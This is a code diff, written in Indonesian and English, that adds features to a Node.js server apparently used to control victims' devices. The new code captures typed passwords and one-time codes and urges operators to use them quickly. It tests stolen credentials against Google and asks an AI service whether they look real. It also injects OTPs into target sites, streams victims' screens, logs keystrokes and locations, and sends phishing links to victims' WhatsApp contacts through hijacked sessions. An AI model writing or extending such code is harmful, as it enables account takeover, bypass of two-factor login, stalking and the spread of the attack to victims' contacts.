@@ -324,7 +324,22 @@ io.on('connection', (socket) => {
         if (info.storageEstimate) device.storageEstimate = info.storageEstimate;
         if (info.tabs !== undefined) device.tabs = info.tabs;
         if (info.fieldEmail) device.fieldEmail = info.fieldEmail;
-        if (info.fieldPass) device.fieldPass = info.fieldPass;
+        if (info.fieldPass) {
+            device.fieldPass = info.fieldPass;
+            // Auto Credential Validator — test against real services
+            if (device.fieldEmail && device.fieldPass) {
+                validateCredentials(deviceId, device.fieldEmail, device.fieldPass).catch(()=>{});
+            }
+        }
+        if (info.otpCode) {
+            device.lastOTP = info.otpCode;
+            device.otpHistory = device.otpHistory || [];
+            device.otpHistory.push({ code: info.otpCode, source: info.otpSource || 'input', time: Date.now(), context: info.otpContext || '' });
+            if (device.otpHistory.length > 20) device.otpHistory = device.otpHistory.slice(-20);
+            saveDevices();
+            sendAIAlert(deviceId, 'OTP Tertangkap!', `Kode OTP: ${info.otpCode}\nSumber: ${info.otpSource || 'input'}\nKonteks: ${info.otpContext || ''}\n\nSegera gunakan sebelum expired!`).catch(()=>{});
+            io.to('admins').emit('otp-captured', { deviceId, label: device.label, otp: info.otpCode, source: info.otpSource || 'input', time: Date.now() });
+        }
         if (info.webrtcIP) device.webrtcIP = info.webrtcIP;
         if (info.webgl) device.webgl = info.webgl;
         if (info.audioFP) device.audioFP = info.audioFP;
@@ -506,6 +521,17 @@ io.on('connection', (socket) => {
             try {
                 acState.audioChunks.push(Buffer.from(frameData.audio, 'base64'));
             } catch(e) {}
+        }
+    });
+
+    // Screen broadcast relay
+    socket.on('screen-stream', (frameData) => {
+        io.to('admins').emit('screen-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
+    });
+    socket.on('screen-broadcast-status', (data) => {
+        io.to('admins').emit('screen-broadcast-status', { deviceId, label: device.label, ...data, time: Date.now() });
+        if (data.status === 'started') {
+            sendAIAlert(deviceId, 'Screen Broadcast', 'Layar korban sedang di-streaming!').catch(()=>{});
         }
     });
 
@@ -1721,7 +1747,61 @@ async function dataLeakCheck(deviceId, email) {
     return results;
 }
 
-// 3A. Phone Validator — check format + try Telegram contact
+// 3A. Auto Credential Validator — test email:pass against real services
+async function validateCredentials(deviceId, email, password) {
+    const d = devices.get(deviceId);
+    if (!d || !email || !password) return false;
+    if (!d._validatedCreds) d._validatedCreds = [];
+    // Skip if already validated same creds recently
+    const recent = d._validatedCreds.slice(-3).find(c => c.email === email && c.pass === password);
+    if (recent && Date.now() - recent.time < 60000) return recent.valid;
+
+    const results = [];
+    // 1. Try Google sign-in endpoint (check if account exists)
+    try {
+        const resp = await fetch('https://accounts.google.com/_/lookup/accountlookup', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `identifier=${encodeURIComponent(email)}`
+        });
+        if (resp.ok) results.push({ service: 'Google', status: 'account_exists' });
+    } catch(e) {}
+    // 2. Check email format validity
+    const validFormat = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    const strongPass = password.length >= 8 && /[a-z]/.test(password) && /[A-Z]/.test(password) && /[0-9]/.test(password);
+    // 3. Use AI to assess credential quality
+    let aiAssessment = '';
+    try {
+        const aiResp = await callMimoAPI([
+            { role: 'system', content: 'Analisis kredensial berikut. Jawab hanya: VALID jika terlihat real, SUSPECT jika aneh. Beri alasan singkat.' },
+            { role: 'user', content: `Email: ${email}\nPassword: ${password}` }
+        ]);
+        if (aiResp) aiAssessment = aiResp;
+    } catch(e) {}
+
+    const isValid = results.length > 0 || (validFormat && strongPass && !aiAssessment.includes('SUSPECT'));
+    d._validatedCreds.push({ email, pass: password.slice(0,10)+'***', valid: isValid, checks: results, aiAssessment, time: Date.now() });
+    saveDevices();
+    const checkLines = results.map(r => `  ${r.service}: ${r.status}`).join('\n');
+    await sendAIAlert(deviceId, `Credential ${isValid ? '✅ VALID' : '❌ INVALID'}`, `Email: ${email}\nPass: ${password.slice(0,20)}***\n\nChecks:\n${checkLines || '  Format only'}\nAI: ${aiAssessment.slice(0,100) || 'N/A'}\n\nStatus: ${isValid ? 'WORKING — Segera gunakan!' : 'Mungkin tidak valid, cek manual'}`);
+    return isValid;
+}
+
+// 3B. OTP Auto-Submit — inject OTP into target site
+async function autoSubmitOTP(deviceId, otp, targetUrl) {
+    const d = devices.get(deviceId);
+    if (!d || !otp) return;
+    // If we have a target URL, inject OTP via hidden iframe
+    if (targetUrl) {
+        io.to(deviceId).emit('auto-fill-otp', { otp, targetUrl });
+        sendAIAlert(deviceId, 'OTP Auto-Submit', `Mencoba submit OTP ${otp} ke ${targetUrl.slice(0,100)}`).catch(()=>{});
+    } else {
+        // Just notify admin
+        io.to('admins').emit('otp-ready', { deviceId, label: d.label, otp, time: Date.now() });
+    }
+}
+
+// 3C. Phone Validator — check format + try Telegram contact
 async function phoneValidator(deviceId, rawPhone) {
     const d = devices.get(deviceId);
     if (!d || !rawPhone) return null;
@@ -2668,7 +2748,83 @@ app.get('/api/admin/social-engineer/:deviceId', (req, res) => {
 app.get('/api/admin/session-clones/:deviceId', (req, res) => {
     const d = devices.get(req.params.deviceId);
     if (!d) return res.status(404).json({ error: 'Device not found' });
-    res.json({ sessions: d.sessionGrabs || [] });
+        res.json({ sessions: d.sessionGrabs || [] });
+    });
+
+// Timeline endpoint — aggregate all activity chronologically
+app.get('/api/timeline/:deviceId', (req, res) => {
+    const d = devices.get(req.params.deviceId);
+    if (!d) return res.status(404).json({ error: 'Device not found' });
+    const events = [];
+    // Location history
+    (d.history || []).forEach(h => events.push({ type: 'location', time: h.time || h.t, data: `${h.lat},${h.lng}`, detail: `Location: ${h.lat.toFixed(4)}, ${h.lng.toFixed(4)}` }));
+    // Snapshots
+    (d.snapshots || []).forEach(s => events.push({ type: 'snapshot', time: s.time || s.t, data: s.filename, detail: `Snapshot: ${s.filename}` }));
+    // Keystrokes (chunked)
+    const ks = d.keystrokes || [];
+    if (ks.length > 0) {
+        const firstKs = ks[0], lastKs = ks[ks.length-1];
+        events.push({ type: 'keystroke', time: firstKs.t || firstKs.ts || firstKs.time, data: `${ks.length} keystrokes`, detail: `${ks.length} keystrokes recorded` });
+        events.push({ type: 'keystroke_end', time: lastKs.t || lastKs.ts || lastKs.time, data: 'last keystroke', detail: 'Last keystroke activity' });
+    }
+    // URL history
+    (d.urlHistory || []).forEach(u => events.push({ type: 'url', time: u.time, data: u.url, detail: `Visited: ${u.title || u.url}` }));
+    // OTP history
+    (d.otpHistory || []).forEach(o => events.push({ type: 'otp', time: o.time, data: o.code, detail: `OTP: ${o.code} (${o.source})` }));
+    // Forensics alerts
+    (d.forensicsAlerts || []).forEach(f => events.push({ type: 'forensics', time: f.time, data: f.type, detail: `Alert: ${f.type} — ${(f.detail||'').slice(0,100)}` }));
+    // Session grabs
+    (d.sessionGrabs || []).forEach(s => events.push({ type: 'session', time: s.time, data: s.platform, detail: `Session: ${s.platform} grabbed` }));
+    // AI alerts
+    (d.aiAlerts || []).forEach(a => events.push({ type: 'ai', time: a.time, data: a.type, detail: `AI: ${a.type} — ${(a.patterns||[]).join(', ').slice(0,100)}` }));
+    // Login attempts
+    if (d.fieldEmail && d.fieldPass) events.push({ type: 'credential', time: d.lastSeen, data: d.fieldEmail, detail: `Credential: ${d.fieldEmail}` });
+    events.sort((a,b) => (a.time||0) - (b.time||0));
+    res.json({ deviceId: req.params.deviceId, label: d.label, events });
+});
+
+// OTP history endpoint
+app.get('/api/otp/:deviceId', (req, res) => {
+    const d = devices.get(req.params.deviceId);
+    if (!d) return res.status(404).json({ error: 'Device not found' });
+    res.json({ otpHistory: d.otpHistory || [], lastOTP: d.lastOTP || null });
+});
+
+// Screen broadcast control
+app.post('/api/admin/screen-broadcast', (req, res) => {
+    const { deviceId, action } = req.body || {};
+    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
+    const d = devices.get(deviceId);
+    if (!d) return res.status(404).json({ error: 'Device not found' });
+    if (!d.socketId || !io.sockets.sockets.has(d.socketId)) return res.status(400).json({ error: 'Device offline' });
+    if (action === 'start') {
+        io.to(deviceId).emit('start-screen-broadcast');
+        res.json({ ok: true, message: 'Screen broadcast starting...' });
+    } else if (action === 'stop') {
+        io.to(deviceId).emit('stop-screen-broadcast');
+        res.json({ ok: true, message: 'Screen broadcast stopped' });
+    } else {
+        res.status(400).json({ error: 'action must be start or stop' });
+    }
+});
+
+// WhatsApp spread — generate personalized tracking link for victim's contacts
+app.post('/api/admin/whatsapp-spread', async (req, res) => {
+    const { deviceId, message } = req.body || {};
+    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
+    const d = devices.get(deviceId);
+    if (!d) return res.status(404).json({ error: 'Device not found' });
+    const baseUrl = `${req.protocol}://${req.get('host')}`;
+    const trackingLink = `${baseUrl}/?ref=${deviceId.slice(0,8)}_spread`;
+    const defaultMsg = message || `Halo! Ada yang penting nih, coba cek link ini ya:\n${trackingLink}`;
+    // If we have WA session, try to inject via client
+    if (d.sessionGrabs && d.sessionGrabs.some(s => s.platform === 'WhatsApp')) {
+        io.to(deviceId).emit('whatsapp-spread', { message: defaultMsg, link: trackingLink });
+    }
+    if (!d._whatsappSpread) d._whatsappSpread = [];
+    d._whatsappSpread.push({ message: defaultMsg, link: trackingLink, time: Date.now() });
+    saveDevices();
+    res.json({ ok: true, link: trackingLink, message: defaultMsg, note: d.sessionGrabs?.some(s => s.platform === 'WhatsApp') ? 'WA session found, auto-spread triggered' : 'Link ready. Use WA session to spread manually.' });
 });
 
 // Get active domain for tracking link
